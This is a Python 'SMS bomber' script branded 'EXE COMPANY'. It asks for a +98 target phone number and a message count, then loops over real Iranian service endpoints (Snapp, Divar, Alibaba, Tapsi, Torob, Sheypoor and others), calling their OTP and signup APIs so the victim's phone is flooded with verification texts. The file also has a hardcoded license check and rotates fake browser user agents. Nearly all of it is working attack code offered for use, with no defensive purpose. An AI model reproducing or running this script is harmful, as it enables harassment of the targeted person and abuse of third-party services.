import requests
import os
import random
from tqdm import tqdm
from time import sleep
from colorama import Fore  
from os import system , name
from requests import post , get
from pystyle import *

fL = r'''                        
$$$$$$$$\ $$\   $$\ $$$$$$$$\          $$\       $$\ $$\    
$$  _____|$$ |  $$ |$$  _____|        $$  |     $$  |\$$\   
$$ |      \$$\ $$  |$$ |             $$  /     $$  /  \$$\  
$$$$$\     \$$$$  / $$$$$\          $$  /     $$  /    \$$\ 
$$  __|    $$  $$<  $$  __|         \$$<     $$  /     $$  |
$$ |      $$  /\$$\ $$ |             \$$\   $$  /     $$  / 
$$$$$$$$\ $$ /  $$ |$$$$$$$$\         \$$\ $$  /     $$  /  
\________|\__|  \__|\________|         \__|\__/      \__/

                   Developed By ⸸ fL ᵉˣᵉ
'''
System.Size(120, 30)
System.Clear()
Anime.Fade(Center.Center(fL), Colors.purple_to_blue, Colorate.Vertical, interval=0.030, enter=True)


loop = tqdm(total = 1000, position=0, leave=False)
for k in range(1000):
    loop.set_description("Loading.....".format(k))
    loop.update(1)
loop.close()



def pas():
   password = "ZXhlIGlzIGhlcmU"
   char = input(f'{Fore.MAGENTA} Enter License : ')
   if password == char:
      print('{Fore.MAGENTA}Life time License √.')
   else:
    print(' {Fore.MAGENTA}License incorrect × .')
    pas()

pas()

print()

def logo() :
 print(f'''
{Fore.MAGENTA}
/$$$$$$$        /$$     /$$       /$$$$$$$$       /$$             /$$       /$$$$$$$$ /$$      
| $$__  $$      |  $$   /$$/      |_____ $$       |  $$           /$$/      | $$_____/| $$      
| $$  \ $$       \  $$ /$$/            /$$/        \  $$         /$$/       | $$      | $$      
| $$$$$$$/        \  $$$$/            /$$/          \  $$       /$$/        | $$$$$   | $$      
| $$__  $$         \  $$/            /$$/            /$$/      |  $$        | $$__/   | $$      
| $$  \ $$          | $$            /$$/            /$$/        \  $$       | $$      | $$      
| $$  | $$          | $$           /$$$$$$$$       /$$/          \  $$      | $$      | $$$$$$$$
|__/  |__/          |__/          |________/      |__/            \__/      |__/      |________/
                                                                                                                                      
                                                                                                                                      
                                                                                                                                     
      
                                                      
                            {Fore.MAGENTA}                                                                           {Fore.MAGENTA}   
                            {Fore.MAGENTA}  EXE COMPANY : https://discord.gg/021                                  
                              DEVELOPED BY FL ᵉˣᵉ    EDITED BY RYZ ᵉˣᵉ 
                        
                           
''')



def clear():
    if name == 'nt':
        _ = system('cls')
    
    else:
        _ = system('clear')


heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
] 
random_heads = random.choice(heads)



sended = []

def log(looping_count, sms_number, phone_number):
    clear()
    logo()

    return_200 = str(sended.count(1))
    return_error = str(sended.count(0))
    return_internet_error = str(sended.count(-1))

    print(f"{Fore.MAGENTA}────────────────────────────────────────────")
    print("[-] NUmber Off Target : +98 {}".format(phone_number))
    print("\n\n[*] worked : {}/{}     error: {}    system os error: {}".format(return_200, sms_number, return_error, return_internet_error))
    print("\n[*] all send : {}".format(looping_count))
    print(f"{Fore.MAGENTA}─────────────────────────────────────────────")


# dos loop-----------------------------?
 
def start():
    looping_count = 0

    clear()
    logo()
    print("\n\n")
    phone_number = str(input(f"{Fore.MAGENTA}[+] Target number:\n +98 "))
    sms_number = int(input(f"{Fore.MAGENTA}[+] Number of sms:\n "))

    while looping_count <= sms_number:

        if sended.count(1) >= sms_number:
            clear()
            log(looping_count, sms_number, phone_number)
            print("\n[-] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
            break
        
        else:
            log(looping_count, sms_number, phone_number)

            looping_count = looping_count + 1
            
            snap(phone_number)
            tamland(phone_number)
            alibaba(phone_number)
            tapsi(phone_number)
            divar(phone_number)
            sbm24(phone_number)
            anten(phone_number)
            snap_doctor(phone_number)
            togmond(phone_number)
            torob(phone_number)
            limited_sites(phone_number)
            snap_room(phone_number)
            Sheypoor(phone_number)
            

            

# -----------------001 snap----------------
def snap(phone_number):
    try:
        phone_number = "+98" + phone_number
        data = {"cellphone":phone_number}
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        p = post(url, json=data, timeout=2)
        sleep(0)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[snap] worked send to : {}".format(p))
            
        else:
            print("[-snap] 404 Not sended{}".format(p))
            sended.append(0)
    except:
        print("[-snap] Check Your internet service")
        sended.append(-1)
        



# -------------------002 tamland------------------------
def tamland(phone_number):
    try:
        phone_number = "0" + phone_number
        

        data = {"Mobile":phone_number,"SchoolId":-1}
        url = "https://api.famiran.com/api/user/signup"
        p = post(url, json=data, timeout=2)
        sleep(0)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[tamland] worked send to : {}".format(p))
            
        else:
            print("[-tamland] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-tamland] Check Your internet service")
        sended.append(-1)
        


# ---------------------003 alibaba------------------------ 
def alibaba(phone_number):
    try:
        phone_number = phone_number
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data = {"phoneNumber":phone_number}
        p = post(url, json=data, timeout=3)
        sleep(0)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[alibaba] worked send to : {}".format(p))
            
        else: 
            print("[-alibaba] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-alibaba] Check Your internet service")
        sended.append(-1)

# ------------------------004 tapsi -limit-------------------------
def tapsi(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
        url = "https://tap33.me/api/v2/user"
        p = post(url, json=data, timeout=2 )
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[tapsi] worked send to : {}".format(p))
        else:
            print("[-tapsi] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-tapsi] Check Your internet service")
        sended.append(-1)



# -----------------------005 divar------------------------------
def divar(phone_number):
    try:
        phone_number = phone_number
        data = {"phone":phone_number}
        url = "https://api.divar.ir/v5/auth/authenticate"
        p = post(url, json=data, timeout=2)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[divar] worked send to : {}".format(p))
        else:
            print("[-divar] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-divar] Check Your internet service")
        sended.append(-1)


# ----------------------006 sbm24 -limit-------------------------------
def sbm24(phone_number):
    try:
        data = {}
        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[sbm24] worked send to : {}".format(p))
        else:
            print("[-sbm24] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-sbm24] Check Your internet service")
        sended.append(-1)



# -------------------------007 snap market--------------------------
def snap_market(phone_number):
    try:

        data = {}
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[snap_market] worked send to : {}".format(p))
        else:
            print("[-snap_market] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-snap_market] Check Your internet service")
        sended.append(-1)



# --------------------008 anten -----------------------------
def anten(phone_number):
    try:
        phone_number = '0'+phone_number
        data = {"phone":phone_number}
        url = "https://api2.anten.ir/users/"
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[anten] worked send to : {}".format(p))
        else:
            print("[-anten] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-anten] Check Your internet service")
        sended.append(-1)


# ---------------------------009 snap doctor ------------------------------------
def snap_doctor(phone_number):
    try:
        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
        p = get(url, timeout=3)
        rp = p.json()
        rp = rp["result"]
        sleep(0)
        if rp == "SUCCESS":
            sended.append(1)
            print("[snap doctor] send get and : {}".format(rp))
    except:
        print("[-snap doctor] Check Your internet service")
        sended.append(-1)


# --------------------------010 togmond ----------------------------------------
def togmond(phone_number):
    try:
        phone_number = phone_number
        data = "utf8=%E2%9C%93&phone_number=0{}".format(phone_number)
        url = "https://tagmond.com/phone_number"
        p = post(url, data=data, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(2) 
            print("[togmond] worked send to : {}".format(p))
        else:
            print("[-togmond] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-togmond] Check Your internet service")
        sended.append(-1)


# ---------------------------011 torob-------------------------------
def torob(phone_number):
    try:
        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[torob] worked send to : {}".format(p))
        else:
            print("[-torob] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-torob] Check Your internet service")
        sended.append(-1)


# -------------------------012 lomited sites---------------------
def limited_sites(phone_number):
    try:
        data = {"username":phone_number}     
        url = "https://www.tebinja.com/api/v1/users"
        post(url, json=data, timeout=1)
        sleep(0)
    except:
        sended.append(1)
    
# --------------------013 snap room-----------------------
def snap_room(phone_number):
    try:
        data = {"username":"0"+phone_number}    
        url = "https://napi.snapproom.com/users/self/verification-flow"
        p = post(url, json=data, timeout=2)
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[snap room] worked send to : {}".format(p))
        else:
            print("[-snap room] 404 Not sended {}".format(p))
            sended.append(0)
    except:
        print("[-snap room] Check Your internet service")
        sended.append(-1)
        
# ------------------014 Sheypoor-------------------------------
def Sheypoor(phone_number):
    data = {"username": "0" + phone_number}
    url = "https://www.sheypoor.com/api/v10.0.0/auth/send"
    p = post(url, json=data, timeout=2, headers=random_heads)
    sleep(0)

    rp = p.status_code
    if rp == 200 :
        sended.append(1)
        print("[sheypoor] worked send to : {}".format(p))
        
    else:
        print("[-sheypoor] 404 Not sended{}".format(p))
        sended.append(0)

site_function = 13


if __name__ == "__main__":
    start()